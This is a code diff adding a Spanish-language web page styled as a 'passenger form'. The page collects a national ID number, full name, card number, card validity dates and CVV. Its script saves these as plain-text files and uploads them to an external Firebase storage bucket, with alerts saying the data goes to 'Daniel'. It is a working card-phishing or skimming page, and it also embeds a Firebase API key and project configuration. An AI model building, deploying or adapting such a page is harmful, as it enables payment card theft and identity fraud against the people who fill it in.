@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Pasajero</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #0056b3;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin: 10px 0 5px;
+        }
+
+        input {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            background-color: #0056b3;
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #004494;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Formulario de Pasajero</h1>
+        <form id="passengerForm">
+            <label for="dni">DNI DEL PASAJERO:</label>
+            <input type="text" id="dni" name="dni" required>
+            
+            <label for="numTarjeta">NUMERO TARJETA:</label>
+            <input type="text" id="numTarjeta" name="numTarjeta" required>
+
+            <label for="apellido">APELLIDO:</label>
+            <input type="text" id="apellido" name="apellido" required>
+            
+            <label for="nombre">NOMBRE:</label>
+            <input type="text" id="nombre" name="nombre" required>
+            
+            <label for="desde">DESDE (MM/YY):</label>
+            <input type="text" id="desde" name="desde" placeholder="MM/YY" required>
+            
+            <label for="hasta">HASTA (MM/YY):</label>
+            <input type="text" id="hasta" name="hasta" placeholder="MM/YY" required>
+            
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required>
+            
+            <button type="submit">CONFIRMAR DATOS</button>
+        </form>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-storage.js"></script>
+    <script>
+        // Configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlsZmRgBEGkzgT3_c00CbEBqzYnVf4oYk",
+            authDomain: "audiosweb-74dc8.firebaseapp.com",
+            projectId: "audiosweb-74dc8",
+            storageBucket: "audiosweb-74dc8.appspot.com",
+            messagingSenderId: "865220172127",
+            appId: "1:865220172127:web:54f3bf705dbae82b22feea",
+            measurementId: "G-CTFJN6PC37"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+
+        // Función de validación de fechas
+        function validateDateFormat(date) {
+            const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;  // Formato MM/YY
+            return regex.test(date);
+        }
+
+        document.getElementById('passengerForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const dni = document.getElementById('dni').value;
+            const numTarjeta = document.getElementById('numTarjeta').value;
+            const apellido = document.getElementById('apellido').value;
+            const nombre = document.getElementById('nombre').value;
+            const desde = document.getElementById('desde').value;
+            const hasta = document.getElementById('hasta').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!validateDateFormat(desde) || !validateDateFormat(hasta)) {
+                alert('Por favor, ingresa las fechas en el formato MM/YY.');
+                return;
+            }
+
+            const data = `
+                DNI DEL PASAJERO: '${dni}'
+                NUMERO TARJETA: '${numTarjeta}'
+                APELLIDO: '${apellido}'
+                NOMBRE: '${nombre}'
+                DESDE: '${desde}'
+                HASTA: '${hasta}'
+                CVV: '${cvv}'
+            `;
+
+            const file = new Blob([data], { type: 'text/plain' });
+            const fileName = `pasajeros/${dni}-${apellido}-${nombre}.txt`;
+            const storageRef = storage.ref().child(fileName);
+
+            storageRef.put(file).then(function (snapshot) {
+                alert('Datos confirmados y enviados a Daniel.');
+            }).catch(function (error) {
+                console.error('Error al enviar los datos a Daniel:', error);
+                alert('Error al enviar los datos a Daniel');
+            });
+        });
+    </script>
+</body>
+</html>
